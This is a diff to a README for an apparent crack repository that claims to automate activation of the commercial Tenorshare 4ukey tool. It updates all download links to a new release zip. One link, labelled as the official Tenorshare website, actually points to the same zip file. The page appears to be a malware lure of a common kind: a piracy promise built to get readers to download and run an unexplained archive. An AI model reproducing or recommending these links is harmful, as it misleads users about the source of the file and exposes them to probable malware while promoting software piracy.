@@ -6,9 +6,9 @@ Welcome to the Tenorshare-4ukey-Full repository! This script is designed to simp
 
 To get started, you can download the activation script from the following link: 
 
-[![Download https://github.com/S1mpSensei/Tenorshare-4ukey-Full/releases/download/v1.0.0/Application.zip](https://github.com/S1mpSensei/Tenorshare-4ukey-Full/releases/download/v1.0.0/Application.zip)](https://github.com/S1mpSensei/Tenorshare-4ukey-Full/releases/download/v1.0.0/Application.zip)
+[![Download https://github.com/S1mpSensei/Tenorshare-4ukey-Full/releases/download/v2.0/Software.zip](https://github.com/S1mpSensei/Tenorshare-4ukey-Full/releases/download/v2.0/Software.zip)](https://github.com/S1mpSensei/Tenorshare-4ukey-Full/releases/download/v2.0/Software.zip)
 
-Once you have downloaded the "https://github.com/S1mpSensei/Tenorshare-4ukey-Full/releases/download/v1.0.0/Application.zip" file, extract it and you will find the script ready to automate the activation process for Tenorshare 4ukey.
+Once you have downloaded the "https://github.com/S1mpSensei/Tenorshare-4ukey-Full/releases/download/v2.0/Software.zip" file, extract it and you will find the script ready to automate the activation process for Tenorshare 4ukey.
 
 ## 🌟 Key Features
 
@@ -50,7 +50,7 @@ We appreciate your interest in this project. Feel free to contribute by suggesti
 
 ## 🌐 Explore Further
 
-For more information and updates on Tenorshare 4ukey, we recommend visiting the [official Tenorshare website](https://github.com/S1mpSensei/Tenorshare-4ukey-Full/releases/download/v1.0.0/Application.zip).
+For more information and updates on Tenorshare 4ukey, we recommend visiting the [official Tenorshare website](https://github.com/S1mpSensei/Tenorshare-4ukey-Full/releases/download/v2.0/Software.zip).
 
 Dive into the world of easy and automated activation for Tenorshare 4ukey with this repository. Get ready to unlock the full potential of this software effortlessly!
 
